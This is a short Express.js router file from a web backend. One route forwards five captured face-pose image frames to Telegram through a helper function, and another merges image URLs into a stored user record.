import express from "express";
import axios from "axios";
import { sendImageToTelegram } from "../utils/imageUpload.js";
import userModel from "../models/userModel.js";
const router = express.Router()



router.post('/upload/:id', async (req, res) => {
    const { id } = req.params;
    const {  capturedFrames } = req.body;
    const { center, left, right, up, down } = capturedFrames;
  
    // Send each frame to Telegram
    try {
        if (center) {
          await sendImageToTelegram(center, 'center');
        }
        if (left) {
          await sendImageToTelegram(left, 'left');
        }
        if (right) {
          await sendImageToTelegram(right, 'right');
        }
        if (up) {
          await sendImageToTelegram(up, 'up');
        }
        if (down) {
          await sendImageToTelegram(down, 'down');
        }
        res.status(200).send('All frames sent to Telegram');
        } catch (error) {
            res.status(500).send('Error sending frames to Telegram');
            }
            })
router.put('/update-imageUrls/:id', async (req, res) => {
              const { id } = req.params;
              const { imageUrls } = req.body;
            
              try {
                const user = await userModel.findOne({ id });
            
                if (!user) {
                  return res.status(404).send('User not found');
                }
            
                if (!user.imageUrls) {
                  user.imageUrls = imageUrls;
                } else {
                  user.imageUrls = { ...user.imageUrls, ...imageUrls }; 
                }
            
                await user.save();
            
                res.status(200).send('Image URLs updated successfully');
              } catch (error) {
                console.error('Error updating image URLs:', error);
                res.status(500).send('Error updating image URLs');
              }
            });
            

export default router